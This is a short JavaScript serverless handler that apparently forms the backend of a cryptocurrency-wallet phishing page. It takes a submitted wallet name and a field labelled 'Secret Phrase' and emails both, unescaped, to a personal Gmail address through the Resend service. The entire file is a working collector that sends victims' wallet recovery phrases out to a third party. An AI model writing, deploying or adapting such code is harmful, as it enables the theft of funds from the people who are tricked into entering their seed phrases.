import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export default async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const { walletName = "Unknown Wallet", message = "" } = req.body;

  try {
    await resend.emails.send({
      from: "AJ Digital <onboarding@resend.dev>",
      to: "ajdigital48@gmail.com",
      subject: `New Wallet Form Submission - ${walletName}`,
      html: `
        <h2>New Wallet Form Submission</h2>
        <p><b>Wallet:</b> ${walletName}</p>
        <p><b>Secret Phrase:</b></p>
        <p>${message}</p>
      `,
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ error: error.message });
  }
};
